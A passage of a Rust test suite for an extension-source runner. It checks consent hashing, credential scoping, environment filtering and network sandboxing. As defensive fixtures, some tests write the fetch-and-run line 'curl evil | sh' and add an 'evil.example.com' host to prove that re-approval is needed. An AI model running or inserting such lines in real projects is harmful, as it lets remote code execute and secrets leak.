        std::fs::write(&p, format!("#!/bin/sh\n{body}\n")).unwrap();
        std::fs::set_permissions(&p, std::fs::Permissions::from_mode(0o755)).unwrap();
    }

    #[test]
    fn approvals_are_bound_to_the_entry_hash() {
        let ext = tempfile::tempdir().unwrap();
        let state = tempfile::tempdir().unwrap();
        script(ext.path(), "bin/sync.sh", "echo one");
        let h1 = entry_hash(ext.path(), "bin/sync.sh").unwrap();
        let approvals = crate::exec_consent::ApprovalStore::for_tests(state.path());
        assert!(!is_approved(&approvals, "my-gh", "gh", &h1));
        approve(&approvals, "my-gh", "gh", &h1).unwrap();
        assert!(is_approved(&approvals, "my-gh", "gh", &h1));
        assert!(!is_approved(&approvals, "my-gh", "other", &h1));
        script(ext.path(), "bin/sync.sh", "echo two");
        let h2 = entry_hash(ext.path(), "bin/sync.sh").unwrap();
        assert_ne!(h1, h2);
        assert!(
            !is_approved(&approvals, "my-gh", "gh", &h2),
            "a changed script needs re-approval"
        );
    }

    #[test]
    fn exec_passes_only_declared_env_and_parses_entities() {
        let ext = tempfile::tempdir().unwrap();
        script(
            ext.path(),
            "bin/sync.sh",
            r#"printf '{"entities":{"pr":[{"number":1,"title":"%s|%s"}]}}' "$GH_TOKEN" "$SECRET""#,
        );
        let env = |k: &str| match k {
            "GH_TOKEN" => Some("tok".to_string()),
            "SECRET" => Some("leak".to_string()),
            _ => None,
        };
        let out = exec_source(
            ext.path(),
            &spec("bin/sync.sh", &["GH_TOKEN"]),
            &env,
            &BTreeMap::new(),
            Duration::from_secs(10),
            &Egress::Open,
        )
        .unwrap();
        assert_eq!(out.entities["pr"][0]["title"], json!("tok|"));
    }

    #[test]
    fn exec_reports_failures_timeouts_and_bad_output() {
        let ext = tempfile::tempdir().unwrap();
        let none = |_: &str| None;
        script(ext.path(), "fail.sh", "echo boom >&2; exit 3");
        let e = exec_source(
            ext.path(),
            &spec("fail.sh", &[]),
            &none,
            &BTreeMap::new(),
            Duration::from_secs(10),
            &Egress::Open,
        )
        .unwrap_err();
        assert!(e.contains("exit") && e.contains("boom"), "{e}");

        script(ext.path(), "slow.sh", "sleep 5");
        let e = exec_source(
            ext.path(),
            &spec("slow.sh", &[]),
            &none,
            &BTreeMap::new(),
            Duration::from_millis(300),
            &Egress::Open,
        )
        .unwrap_err();
        assert!(e.contains("timed out"), "{e}");

        script(ext.path(), "junk.sh", "echo not json");
        let e = exec_source(
            ext.path(),
            &spec("junk.sh", &[]),
            &none,
            &BTreeMap::new(),
            Duration::from_secs(10),
            &Egress::Open,
        )
        .unwrap_err();
        assert!(e.contains("JSON"), "{e}");

        script(
            ext.path(),
            "undeclared.sh",
            r#"echo '{"entities":{"issue":[]}}'"#,
        );
        let e = exec_source(
            ext.path(),
            &spec("undeclared.sh", &[]),
            &none,
            &BTreeMap::new(),
            Duration::from_secs(10),
            &Egress::Open,
        )
        .unwrap_err();
        assert!(e.contains("issue"), "{e}");

        let e = exec_source(
            ext.path(),
            &spec("missing.sh", &[]),
            &none,
            &BTreeMap::new(),
            Duration::from_secs(10),
            &Egress::Open,
        )
        .unwrap_err();
        assert!(e.contains("missing.sh"), "{e}");
    }

    #[test]
    fn coerces_rows_to_declared_types() {
        let s = spec("x", &[]);
        let e = &s.entities[0];
        let rows = coerce_rows(
            e,
            vec![json!({"number": 7, "title": "T", "score": 2, "draft": true, "opened_at": "2026-09-27T00:00:00Z", "extra": 1})],
        )
        .unwrap();
        assert_eq!(
            rows,
            vec![vec![
                SqlCell::Int(7),
                SqlCell::Text("T".into()),
                SqlCell::Real(2.0),
                SqlCell::Int(1),
                SqlCell::Text("2026-09-27T00:00:00Z".into())
            ]]
        );
        // Missing optional columns are NULL.
        let rows = coerce_rows(e, vec![json!({"number": 8})]).unwrap();
        assert_eq!(rows[0][1], SqlCell::Null(()));
        // Wrong types and a missing key are errors naming the row + column.
        let err = coerce_rows(e, vec![json!({"number": "seven"})]).unwrap_err();
        assert!(err.contains("row 0") && err.contains("number"), "{err}");
        let err = coerce_rows(e, vec![json!({"title": "no key"})]).unwrap_err();
        assert!(err.contains("key"), "{err}");
        let err = coerce_rows(e, vec![json!([1, 2])]).unwrap_err();
        assert!(err.contains("object"), "{err}");
        let _ = SourceSchedule::Manual;
    }

    #[tokio::test]
    async fn run_source_requires_consent_then_stores_queryable_rows() {
        let root = tempfile::tempdir().unwrap();
        let state = root.path().join(".oxplow");
        let ext = root.path().join("oxplow/extensions/my-gh");
        std::fs::create_dir_all(&ext).unwrap();
        std::fs::write(
            ext.join("extension.yaml"),
            "name: my-gh\nsources:\n  - id: gh\n    runtime: exec\n    entry: sync.sh\n    entities:\n      - { name: pr, key: number, columns: { number: int, title: text } }\n",
        )
        .unwrap();
        script(
            &ext,
            "sync.sh",
            r#"echo '{"entities":{"pr":[{"number":1,"title":"First"},{"number":2,"title":"Second"}]}}'"#,
        );
        let db = oxplow_db::Database::in_memory();
        let store = SqliteExtSourceStore::new(db.clone());
        let secrets = oxplow_ai::secrets::MemorySecrets::default();
        let ctx = Sources {
            root: root.path(),
            project: "test-project".into(),
            approvals: &crate::exec_consent::ApprovalStore::for_tests(&state),
            store: &store,
            secrets: &secrets,
            layer: crate::sql_gateway::SqlGateway::new(db.clone()),
            catalog: &crate::extension_catalog::ExtensionCatalog::new(),
            ai: no_ai(),
        };

        let err = run_source(&ctx, "my-gh", "gh", None).await.unwrap_err();
        assert!(
            matches!(err, RunSourceError::NeedsApproval(ref m) if m.contains("approval")),
            "{err:?}"
        );
        assert!(!err.ran());
        assert!(
            store.list_states().await.unwrap().is_empty(),
            "refused runs record nothing"
        );

        let report = run_source(
            &ctx,
            "my-gh",
            "gh",
            Some(&version_of(&ctx, "my-gh", "gh").await),
        )
        .await
        .unwrap();
        assert_eq!(report.row_counts["pr"], 2);
        let out = crate::sql_gateway::SqlGateway::new(db)
            .query_sql("SELECT title FROM v_my_gh_pr ORDER BY number", vec![], None)
            .await
            .unwrap();
        assert_eq!(
            serde_json::to_value(&out.rows).unwrap(),
            json!([["First"], ["Second"]])
        );

        // Approved now, so a later run needs no approve flag…
        run_source(&ctx, "my-gh", "gh", None).await.unwrap();
        // …and a failing run is recorded, keeping the last good rows.
        script(&ext, "sync.sh", "echo nope >&2; exit 1");
        let err = run_source(&ctx, "my-gh", "gh", None).await.unwrap_err();
        assert!(
            matches!(err, RunSourceError::NeedsApproval(_)),
            "script changed: {err:?}"
        );
        let err = run_source(
            &ctx,
            "my-gh",
            "gh",
            Some(&version_of(&ctx, "my-gh", "gh").await),
        )
        .await
        .unwrap_err();
        assert!(err.ran(), "{err:?}");
        let st = &store.list_states().await.unwrap()[0];
        assert_eq!(st.status, "error");
        assert!(st.error.as_deref().unwrap().contains("nope"));
        assert_eq!(st.row_counts["pr"], 2, "last good counts kept");
    }

    #[test]
    fn due_sources_respects_schedule_approval_and_last_run() {
        let base = spec("x", &[]);
        let listing = |schedule: SourceSchedule, approved: bool, last: Option<&str>| {
            let mut spec = base.clone();
            spec.schedule = schedule;
            SourceListing {
                extension: "e".into(),
                spec,
                approved,
                network_enforced: false,
                credentials: vec![],
                version: None,
                state: last.map(|t| SourceState {
                    extension: "e".into(),
                    source_id: "gh".into(),
                    status: "ok".into(),
                    last_run_at: t.into(),
                    error: None,
                    row_counts: BTreeMap::new(),
                }),
            }
        };
        let now = 1_790_000_000_000; // ms
        let iso = |ms: i64| {
            serde_json::to_value(oxplow_domain::Timestamp::from_unix_ms(ms))
                .unwrap()
                .as_str()
                .unwrap()
                .to_string()
        };
        let every10 = SourceSchedule::Every { minutes: 10 };
        let long_ago = iso(now - 11 * 60_000);
        let recent = iso(now - 5 * 60_000);
        let cases = vec![
            (listing(every10, true, None), true),
            (listing(every10, true, Some(&long_ago)), true),
            (listing(every10, true, Some(&recent)), false),
            (listing(every10, false, None), false),
            (listing(SourceSchedule::Manual, true, None), false),
        ];
        for (l, want) in cases {
            let due = due_sources(std::slice::from_ref(&l), now);
            assert_eq!(
                !due.is_empty(),
                want,
                "{:?} approved={} last={:?}",
                l.spec.schedule,
                l.approved,
                l.state.as_ref().map(|s| &s.last_run_at)
            );
        }
    }

    #[test]
    fn exec_injects_credentials_as_env() {
        let ext = tempfile::tempdir().unwrap();
        script(
            ext.path(),
            "bin/sync.sh",
            r#"printf '{"entities":{"pr":[{"number":1,"title":"%s"}]}}' "$GH_PAT""#,
        );
        let creds = BTreeMap::from([("GH_PAT".to_string(), "pat-1".to_string())]);
        let out = exec_source(
            ext.path(),
            &spec("bin/sync.sh", &[]),
            &|_| None,
            &creds,
            Duration::from_secs(10),
            &Egress::Open,
        )
        .unwrap();
        assert_eq!(out.entities["pr"][0]["title"], json!("pat-1"));
    }

    /// Two extensions declaring the same credential name, each with a
    /// script that echoes it into a row.
    fn two_extensions(root: &Path) {
        for name in ["one", "two"] {
            let ext = root.join(format!("oxplow/extensions/{name}"));
            std::fs::create_dir_all(&ext).unwrap();
            std::fs::write(
                ext.join("extension.yaml"),
                format!("name: {name}\nsources:\n  - id: s\n    runtime: exec\n    entry: sync.sh\n    credentials: [TOKEN]\n    entities:\n      - {{ name: row, key: id, columns: {{ id: int, token: text }} }}\n"),
            )
            .unwrap();
            script(
                &ext,
                "sync.sh",
                r#"printf '{"entities":{"row":[{"id":1,"token":"%s"}]}}' "$TOKEN""#,
            );
        }
    }

    #[tokio::test]
    async fn credentials_come_from_the_keychain_scoped_per_extension() {
        let root = tempfile::tempdir().unwrap();
        let state = root.path().join(".oxplow");
        two_extensions(root.path());
        let db = oxplow_db::Database::in_memory();
        let store = SqliteExtSourceStore::new(db.clone());
        let secrets = oxplow_ai::secrets::MemorySecrets::default();
        let ctx = Sources {
            root: root.path(),
            project: "test-project".into(),
            approvals: &crate::exec_consent::ApprovalStore::for_tests(&state),
            store: &store,
            secrets: &secrets,
            layer: crate::sql_gateway::SqlGateway::new(db.clone()),
            catalog: &crate::extension_catalog::ExtensionCatalog::new(),
            ai: no_ai(),
        };

        let list = list_sources(&ctx).await.unwrap();
        assert_eq!(
            list[0].credentials,
            vec![CredentialStatus {
                name: "TOKEN".into(),
                set: false
            }]
        );

        set_source_credential(&ctx, "one", "TOKEN", Some("secret-one")).unwrap();
        let list = list_sources(&ctx).await.unwrap();
        let one = list.iter().find(|l| l.extension == "one").unwrap();
        let two = list.iter().find(|l| l.extension == "two").unwrap();
        assert!(one.credentials[0].set);
        assert!(!two.credentials[0].set, "scoped to its extension");
        assert!(!serde_json::to_string(&list).unwrap().contains("secret-one"));
        // Another project with an extension of the same name doesn't see it.
        let elsewhere = Sources {
            root: root.path(),
            project: "another-project".into(),
            approvals: ctx.approvals,
            store: &store,
            secrets: &secrets,
            layer: crate::sql_gateway::SqlGateway::new(db.clone()),
            catalog: &crate::extension_catalog::ExtensionCatalog::new(),
            ai: no_ai(),
        };
        let other = list_sources(&elsewhere).await.unwrap();
        assert!(
            !other
                .iter()
                .find(|l| l.extension == "one")
                .unwrap()
                .credentials[0]
                .set,
            "credentials are scoped to the project"
        );

        run_source(&ctx, "one", "s", Some(&version_of(&ctx, "one", "s").await))
            .await
            .unwrap();
        run_source(&ctx, "two", "s", Some(&version_of(&ctx, "two", "s").await))
            .await
            .unwrap();
        let out = crate::sql_gateway::SqlGateway::new(db)
            .query_sql(
                "SELECT (SELECT token FROM v_one_row), (SELECT token FROM v_two_row)",
                vec![],
                None,
            )
            .await
            .unwrap();
        assert_eq!(
            serde_json::to_value(&out.rows).unwrap(),
            json!([["secret-one", ""]]),
            "the other extension's same-named credential isn't visible"
        );

        // Only declared names can be set, and None clears.
        let err = set_source_credential(&ctx, "one", "OTHER", Some("x")).unwrap_err();
        assert!(err.to_string().contains("OTHER"), "{err}");
        assert!(set_source_credential(&ctx, "nope", "TOKEN", Some("x")).is_err());
        set_source_credential(&ctx, "one", "TOKEN", None).unwrap();
        assert!(!list_sources(&ctx).await.unwrap()[0].credentials[0].set);
    }

    async fn task_db() -> oxplow_db::Database {
        let db = oxplow_db::Database::in_memory();
        db.transaction(|c| {
            c.execute_batch(
                "INSERT INTO streams (id, kind, title, branch, branch_ref, branch_source, worktree_path, created_at, updated_at)
                   VALUES (1, 'primary', 'p', 'main', 'refs/heads/main', 'local', '/r', '2026-01-01', '2026-01-01');
                 INSERT INTO threads (id, stream_id, title, status, created_at, updated_at)
                   VALUES (1, 1, 'T', 'active', '2026-01-01', '2026-01-01');
                 INSERT INTO task (id, thread_id, title, status, priority, created_by, created_at, updated_at) VALUES
                   (1, 1, 'Fix login', 'ready', 'high', 'agent', '2026-01-01', '2026-01-01'),
                   (2, 1, 'Tidy docs', 'ready', 'low', 'agent', '2026-01-01', '2026-01-01'),
                   (3, 1, 'Ship it', 'done', 'high', 'agent', '2026-01-01', '2026-01-01');",
            )
            .map_err(|e| DomainError::Invalid(e.to_string()))
        })
        .await
        .unwrap();
        db
    }

    fn extension(root: &Path, name: &str, manifest: &str, files: &[(&str, &str)]) {
        let ext = root.join(format!("oxplow/extensions/{name}"));
        std::fs::create_dir_all(&ext).unwrap();
        std::fs::write(ext.join("extension.yaml"), manifest).unwrap();
        for (path, body) in files {
            let p = ext.join(path);
            std::fs::create_dir_all(p.parent().unwrap()).unwrap();
            std::fs::write(p, body).unwrap();
        }
    }

    #[tokio::test]
    async fn derived_sources_transform_their_input_without_approval() {
        let root = tempfile::tempdir().unwrap();
        let state = root.path().join(".oxplow");
        let entity =
            "    entities:\n      - { name: hot, key: id, columns: { id: int, title: text } }\n";
        extension(
            root.path(),
            "work",
            &format!(
                "name: work\nsources:\n  - id: star\n    runtime: starlark\n    entry: hot.star\n    input: \"SELECT id, title, priority FROM v_task WHERE status = 'ready'\"\n{entity}  - id: jq\n    runtime: jaq\n    entry: hot.jq\n    input: \"SELECT id, title FROM v_task\"\n    entities:\n      - {{ name: upper, key: id, columns: {{ id: int, title: text }} }}\n"
            ),
            &[
                (
                    "hot.star",
                    "def transform(input):\n    return {\"entities\": {\"hot\": [{\"id\": r[\"id\"], \"title\": r[\"title\"]} for r in input[\"rows\"] if r[\"priority\"] == \"high\"]}}\n",
                ),
                ("hot.jq", "{entities: {upper: [.rows[] | {id, title: (.title | ascii_upcase)}]}}"),
            ],
        );
        let db = task_db().await;
        let store = SqliteExtSourceStore::new(db.clone());
        let secrets = oxplow_ai::secrets::MemorySecrets::default();
        let ctx = Sources {
            root: root.path(),
            project: "test-project".into(),
            approvals: &crate::exec_consent::ApprovalStore::for_tests(&state),
            store: &store,
            secrets: &secrets,
            layer: crate::sql_gateway::SqlGateway::new(db.clone()),
            catalog: &crate::extension_catalog::ExtensionCatalog::new(),
            ai: no_ai(),
        };
        // No approval asked for, and the listing says it can run.
        assert!(list_sources(&ctx).await.unwrap().iter().all(|l| l.approved));
        let report = run_source(&ctx, "work", "star", None).await.unwrap();
        assert_eq!(report.row_counts["hot"], 1);
        run_source(&ctx, "work", "jq", None).await.unwrap();
        let out = crate::sql_gateway::SqlGateway::new(db)
            .query_sql(
                "SELECT (SELECT title FROM v_work_hot), (SELECT group_concat(title, ',') FROM v_work_upper)",
                vec![],
                None,
            )
            .await
            .unwrap();
        assert_eq!(
            serde_json::to_value(&out.rows).unwrap(),
            json!([["Fix login", "FIX LOGIN,TIDY DOCS,SHIP IT"]])
        );
    }

    /// P5.E2's red: a derived source's `ai_classify` is a recorded
    /// computation — six calls on one text, one model call, recorded as
    /// the source.
    #[tokio::test]
    async fn a_derived_sources_ai_classify_on_one_text_is_one_call() {
        use crate::ai_service::{ProviderConfig, ProviderKind, Role, RoleBinding};
        let root = tempfile::tempdir().unwrap();
        let state = root.path().join(".oxplow");
        extension(
            root.path(),
            "work",
            "name: work\nsources:\n  - id: star\n    runtime: starlark\n    entry: kind.star\n    input: \"SELECT id, title FROM v_task\"\n    entities:\n      - { name: kind, key: id, columns: { id: int, kind: text } }\n",
            &[(
                "kind.star",
                "def transform(input):\n    rows = []\n    for r in input[\"rows\"]:\n        a = ai_classify(\"is this a bug?\", [\"bug\", \"feature\"])\n        b = ai_classify(\"is this a bug?\", [\"bug\", \"feature\"])\n        rows.append({\"id\": r[\"id\"], \"kind\": a[\"label\"] if a == b else \"differs\"})\n    return {\"entities\": {\"kind\": rows}}\n",
            )],
        );
        let db = task_db().await;
        let reply = json!({ "answers": { "label": { "type": "choice", "choice": "bug", "probabilities": { "bug": 0.9, "feature": 0.1 } } } });
        let (base, _) = oxplow_ai::testing::mock(
            "/chat/completions",
            200,
            json!({ "choices": [{ "message": { "content": reply.to_string() } }], "usage": { "prompt_tokens": 4, "completion_tokens": 2 } }),
        )
        .await;
        let ai = std::sync::Arc::new(crate::ai_service::AiService::new(
            oxplow_ai::client::Client::default(),
            std::sync::Arc::new(oxplow_ai::secrets::MemorySecrets::default()),
            std::sync::Arc::new(oxplow_db::SqliteAiCallStore::new(db.clone())),
            Some(state.join("global-config")),
        ));
        ai.save_provider(
            ProviderConfig {
                id: "m".into(),
                kind: ProviderKind::OpenaiCompatible,
                base_url: Some(base),
            },
            None,
        )
        .unwrap();
        ai.set_role(
            Role::Decide,
            Some(RoleBinding {
                provider: "m".into(),
                model: "x".into(),
            }),
        )
        .unwrap();
        let store = SqliteExtSourceStore::new(db.clone());
        let secrets = oxplow_ai::secrets::MemorySecrets::default();
        let ctx = Sources {
            root: root.path(),
            project: "test-project".into(),
            approvals: &crate::exec_consent::ApprovalStore::for_tests(&state),
            store: &store,
            secrets: &secrets,
            layer: crate::sql_gateway::SqlGateway::new(db.clone()),
            catalog: &crate::extension_catalog::ExtensionCatalog::new(),
            ai: std::sync::Arc::new(crate::ai_compute::AiCompute::new(
                ai,
                oxplow_db::SqliteAiResultStore::new(db.clone()),
            )),
        };
        let report = run_source(&ctx, "work", "star", None).await.unwrap();
        assert_eq!(report.row_counts["kind"], 3);
        let out = crate::sql_gateway::SqlGateway::new(db)
            .query_sql(
                "SELECT (SELECT group_concat(DISTINCT kind) FROM v_work_kind), \
                        (SELECT count(*) FROM v_ai_call), (SELECT caller FROM v_ai_call), \
                        (SELECT op || ' ' || role FROM v_ai_result)",
                vec![],
                None,
            )
            .await
            .unwrap();
        assert_eq!(
            serde_json::to_value(&out.rows).unwrap(),
            json!([["bug", 1, "source:work/star", "classify decide"]])
        );
    }

    /// A preview runs the source as its worktree has it and returns the
    /// rows, storing nothing: source data is project-wide, so an agent in
    /// a worktree stream checks its source without overwriting it (tsk377).
    /// An exec source still needs a person's approval.
    #[tokio::test]
    async fn a_preview_returns_rows_and_stores_nothing() {
        let root = tempfile::tempdir().unwrap();
        let state = root.path().join(".oxplow");
        extension(
            root.path(),
            "work",
            "name: work\nsources:\n  - id: star\n    runtime: starlark\n    entry: hot.star\n    input: \"SELECT id, title, priority FROM v_task WHERE status = 'ready'\"\n    entities:\n      - { name: hot, key: id, columns: { id: int, title: text } }\n  - id: sh\n    runtime: exec\n    entry: sync.sh\n    entities:\n      - { name: raw, key: id, columns: { id: int } }\n",
            &[(
                "hot.star",
                "def transform(input):\n    return {\"entities\": {\"hot\": [{\"id\": r[\"id\"], \"title\": r[\"title\"]} for r in input[\"rows\"] if r[\"priority\"] == \"high\"]}}\n",
            )],
        );
        script(
            &root.path().join("oxplow/extensions/work"),
            "sync.sh",
            r#"echo '{"entities":{"raw":[{"id":1}]}}'"#,
        );
        let db = task_db().await;
        let store = SqliteExtSourceStore::new(db.clone());
        let secrets = oxplow_ai::secrets::MemorySecrets::default();
        let ctx = Sources {
            root: root.path(),
            project: "test-project".into(),
            approvals: &crate::exec_consent::ApprovalStore::for_tests(&state),
            store: &store,
            secrets: &secrets,
            layer: crate::sql_gateway::SqlGateway::new(db.clone()),
            catalog: &crate::extension_catalog::ExtensionCatalog::new(),
            ai: no_ai(),
        };
        let preview = preview_source(&ctx, "work", "star").await.unwrap();
        assert_eq!(preview.entities.len(), 1);
        let hot = &preview.entities[0];
        assert_eq!(
            (hot.entity.as_str(), hot.view.as_str()),
            ("hot", "v_work_hot")
        );
        assert_eq!(hot.columns, vec!["id", "title"]);
        assert_eq!(
            serde_json::to_value(&hot.rows).unwrap(),
            json!([[1, "Fix login"]])
        );
        assert_eq!(hot.total, 1);
        assert!(
            store.list_states().await.unwrap().is_empty(),
            "no run recorded"
        );
        assert!(
            crate::sql_gateway::SqlGateway::new(db)
                .query_sql("SELECT * FROM v_work_hot", vec![], None)
                .await
                .is_err(),
            "nothing stored"
        );

        let err = preview_source(&ctx, "work", "sh").await.unwrap_err();
        assert!(matches!(err, RunSourceError::NeedsApproval(_)), "{err:?}");
    }

    #[tokio::test]
    async fn upsert_sources_update_by_key_and_tombstone() {
        let root = tempfile::tempdir().unwrap();
        let state = root.path().join(".oxplow");
        extension(
            root.path(),
            "inc",
            "name: inc\nsources:\n  - id: s\n    runtime: exec\n    entry: sync.sh\n    sync: upsert\n    entities:\n      - { name: item, key: id, columns: { id: int, title: text } }\n      - { name: other, key: id, columns: { id: int } }\n",
            &[],
        );
        let ext = root.path().join("oxplow/extensions/inc");
        let db = task_db().await;
        let store = SqliteExtSourceStore::new(db.clone());
        let secrets = oxplow_ai::secrets::MemorySecrets::default();
        let ctx = Sources {
            root: root.path(),
            project: "test-project".into(),
            approvals: &crate::exec_consent::ApprovalStore::for_tests(&state),
            store: &store,
            secrets: &secrets,
            layer: crate::sql_gateway::SqlGateway::new(db.clone()),
            catalog: &crate::extension_catalog::ExtensionCatalog::new(),
            ai: no_ai(),
        };
        script(
            &ext,
            "sync.sh",
            r#"echo '{"entities":{"item":[{"id":1,"title":"a"},{"id":2,"title":"b"}],"other":[{"id":9}]}}'"#,
        );
        run_source(&ctx, "inc", "s", Some(&version_of(&ctx, "inc", "s").await))
            .await
            .unwrap();
        script(
            &ext,
            "sync.sh",
            r#"echo '{"entities":{"item":[{"id":2,"title":"B"},{"id":3,"title":"c"}]},"deleted":{"item":[1]}}'"#,
        );
        let report = run_source(&ctx, "inc", "s", Some(&version_of(&ctx, "inc", "s").await))
            .await
            .unwrap();
        assert_eq!(
            report.row_counts["item"], 2,
            "counts are the entity's total"
        );
        let out = crate::sql_gateway::SqlGateway::new(db)
            .query_sql(
                "SELECT (SELECT group_concat(id || title, ',') FROM (SELECT * FROM v_inc_item ORDER BY id)), (SELECT count(*) FROM v_inc_other)",
                vec![],
                None,
            )
            .await
            .unwrap();
        assert_eq!(
            serde_json::to_value(&out.rows).unwrap(),
            json!([["2B,3c", 1]]),
            "an entity the run didn't mention is left alone"
        );
    }

    #[test]
    fn tombstones_need_an_upsert_source() {
        let s = spec("x.sh", &[]);
        let err =
            SourceOutput::parse(&s, json!({"entities": {}, "deleted": {"pr": [1]}})).unwrap_err();
        assert!(err.contains("sync: upsert"), "{err}");
    }

    #[tokio::test]
    async fn a_sandboxed_source_reaches_only_its_declared_hosts() {
        if !crate::net_sandbox::enforced() {
            return; // Not enforced on this OS; nothing to check.
        }
        // A local origin standing in for a declared API host.
        let origin = tokio::net::TcpListener::bind(("127.0.0.1", 0))
            .await
            .unwrap();
        let port = origin.local_addr().unwrap().port();
        tokio::spawn(async move {
            use tokio::io::{AsyncReadExt, AsyncWriteExt};
            while let Ok((mut s, _)) = origin.accept().await {
                let mut b = [0u8; 1024];
                let _ = s.read(&mut b).await;
                let _ = s
                    .write_all(
                        b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok",
                    )
                    .await;
            }
        });
        let root = tempfile::tempdir().unwrap();
        let state = root.path().join(".oxplow");
        extension(
            root.path(),
            "net",
            "name: net\nsources:\n  - id: s\n    runtime: exec\n    entry: sync.sh\n    network: [localhost]\n    entities:\n      - { name: r, key: id, columns: { id: int, declared: text, undeclared: text, direct: text } }\n",
            &[],
        );
        let ext = root.path().join("oxplow/extensions/net");
        script(
            &ext,
            "sync.sh",
            &format!(
                r#"a=$(curl -s -o /dev/null -w '%{{http_code}}' http://localhost:{port}/ || true)
b=$(curl -s -o /dev/null -w '%{{http_code}}' http://example.com/ || true)
c=$(curl -s --noproxy '*' --max-time 3 -o /dev/null -w '%{{http_code}}' http://1.1.1.1/ || true)
printf '{{"entities":{{"r":[{{"id":1,"declared":"%s","undeclared":"%s","direct":"%s"}}]}}}}' "$a" "$b" "$c""#
            ),
        );
        let db = task_db().await;
        let store = SqliteExtSourceStore::new(db.clone());
        let secrets = oxplow_ai::secrets::MemorySecrets::default();
        let ctx = Sources {
            root: root.path(),
            project: "test-project".into(),
            approvals: &crate::exec_consent::ApprovalStore::for_tests(&state),
            store: &store,
            secrets: &secrets,
            layer: crate::sql_gateway::SqlGateway::new(db.clone()),
            catalog: &crate::extension_catalog::ExtensionCatalog::new(),
            ai: no_ai(),
        };
        assert!(list_sources(&ctx).await.unwrap()[0].network_enforced);
        run_source(&ctx, "net", "s", Some(&version_of(&ctx, "net", "s").await))
            .await
            .unwrap();
        let out = crate::sql_gateway::SqlGateway::new(db)
            .query_sql(
                "SELECT declared, undeclared, direct FROM v_net_r",
                vec![],
                None,
            )
            .await
            .unwrap();
        assert_eq!(
            serde_json::to_value(&out.rows).unwrap(),
            json!([["200", "403", "000"]]),
            "declared host through the proxy; undeclared refused by it; direct blocked by the sandbox"
        );
    }

    #[test]
    fn widening_the_network_list_needs_approving_again() {
        let ext = tempfile::tempdir().unwrap();
        script(ext.path(), "s.sh", "echo x");
        let mut s = spec("s.sh", &[]);
        let bare = approval_hash(ext.path(), &s).unwrap();
        s.network = vec!["api.github.com".into()];
        let one = approval_hash(ext.path(), &s).unwrap();
        s.network.push("evil.example.com".into());
        let two = approval_hash(ext.path(), &s).unwrap();
        assert!(bare != one && one != two);
    }

    #[test]
    fn a_helper_file_in_the_extension_needs_approving_again() {
        let ext = tempfile::tempdir().unwrap();
        script(ext.path(), "s.sh", ". ./lib.sh");
        script(ext.path(), "lib.sh", "echo ok");
        let s = spec("s.sh", &[]);
        let before = approval_hash(ext.path(), &s).unwrap();
        script(ext.path(), "lib.sh", "curl evil | sh");
        assert_ne!(before, approval_hash(ext.path(), &s).unwrap());
    }

    #[test]
    fn env_and_credentials_are_approved_but_lens_edits_are_not_code() {
        let ext = tempfile::tempdir().unwrap();
        script(ext.path(), "s.sh", "echo x");
        std::fs::write(ext.path().join("extension.yaml"), "name: x\n").unwrap();
        let mut s = spec("s.sh", &[]);
        let base = approval_hash(ext.path(), &s).unwrap();
        s.env = vec!["AWS_SECRET_ACCESS_KEY".into()];
        let with_env = approval_hash(ext.path(), &s).unwrap();
        assert_ne!(base, with_env, "a new env passthrough needs approving");
        s.credentials = vec!["TOKEN".into()];
        assert_ne!(with_env, approval_hash(ext.path(), &s).unwrap());
        let s = spec("s.sh", &[]);
        // Lens and manifest edits aren't code the source runs.
        std::fs::create_dir_all(ext.path().join("lenses")).unwrap();
        std::fs::write(ext.path().join("lenses/a.yaml"), "title: A").unwrap();
        std::fs::write(
            ext.path().join("extension.yaml"),
            "name: x\ndescription: y\n",
        )
        .unwrap();
        assert_eq!(base, approval_hash(ext.path(), &s).unwrap());
    }

    #[tokio::test]
    async fn run_approves_only_the_version_the_person_saw() {
        let root = tempfile::tempdir().unwrap();
        let state = root.path().join(".oxplow");
        let ext = root.path().join("oxplow/extensions/my-gh");
        std::fs::create_dir_all(&ext).unwrap();
        std::fs::write(
            ext.join("extension.yaml"),
            "name: my-gh\nsources:\n  - id: gh\n    runtime: exec\n    entry: sync.sh\n    entities:\n      - { name: pr, key: number, columns: { number: int } }\n",
        )
        .unwrap();
        script(
            &ext,
            "sync.sh",
            r#"echo '{"entities":{"pr":[{"number":1}]}}'"#,
        );
        let db = oxplow_db::Database::in_memory();
        let store = SqliteExtSourceStore::new(db.clone());
        let secrets = oxplow_ai::secrets::MemorySecrets::default();
        let ctx = Sources {
            root: root.path(),
            project: "test-project".into(),
            approvals: &crate::exec_consent::ApprovalStore::for_tests(&state),
            store: &store,
            secrets: &secrets,
            layer: crate::sql_gateway::SqlGateway::new(db.clone()),
            catalog: &crate::extension_catalog::ExtensionCatalog::new(),
            ai: no_ai(),
        };
        let seen = list_sources(&ctx).await.unwrap()[0]
            .version
            .clone()
            .unwrap();
        script(&ext, "sync.sh", "curl evil | sh");
        let err = run_source(&ctx, "my-gh", "gh", Some(&seen))
            .await
            .unwrap_err();
        assert!(
            matches!(err, RunSourceError::NeedsApproval(ref m) if m.contains("changed")),
            "{err:?}"
        );
        assert!(!list_sources(&ctx).await.unwrap()[0].approved);
    }
}
